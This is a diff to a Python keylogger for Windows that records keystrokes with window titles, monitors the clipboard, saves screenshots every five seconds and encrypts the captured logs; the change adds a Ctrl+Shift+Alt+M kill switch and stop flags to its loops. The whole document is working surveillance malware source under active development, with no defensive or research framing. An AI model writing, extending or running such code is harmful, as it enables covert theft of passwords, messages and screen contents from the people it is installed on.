@@ -1,13 +1,15 @@
 import pyperclip
 import threading
 import time
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener, Key
 from datetime import datetime
 import win32gui
 from cryptography.fernet import Fernet
 from PIL import ImageGrab
 
 last_window = None
+pressed_keys = set()
+stop_flag = threading.Event()
 
 def load_key():
     with open("secret.key", "rb") as key_file:
@@ -26,6 +28,15 @@ def log_encrypted(message):
 
 def log_keystroke(key):
     global last_window
+    pressed_keys.add(key)
+    # Check for Ctrl+Shift+Alt+M
+    if ((Key.ctrl_l in pressed_keys or Key.ctrl_r in pressed_keys) and
+        (Key.shift_l in pressed_keys or Key.shift_r in pressed_keys) and
+        (Key.alt_l in pressed_keys or Key.alt_r in pressed_keys) and
+        (getattr(key, 'char', '').lower() == 'm')):
+        stop_flag.set()
+        return False  # Stop the listener
+
     current_window = get_active_window()
     if current_window != last_window:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -44,12 +55,16 @@ def log_keystroke(key):
         else:
             log_encrypted(f"[{timestamp}] [{key}]")
 
+def on_release(key):
+    if key in pressed_keys:
+        pressed_keys.remove(key)
+
 def start_logging():
-    with Listener(on_press=log_keystroke) as listener:
+    with Listener(on_press=log_keystroke, on_release=on_release) as listener:
         listener.join()
 def monitor_clipboard():
     recent_value = ""
-    while True:
+    while not stop_flag.is_set():
         try:
             tmp_value = pyperclip.paste()
             if tmp_value != recent_value:
@@ -64,7 +79,7 @@ def capture_screenshot():
     img = ImageGrab.grab()
     img.save(f"screenshot_{timestamp}.png")
 def periodic_screenshot():
-    while True:
+    while not stop_flag.is_set():
         capture_screenshot()
         time.sleep(5)  
 if __name__ == "__main__":
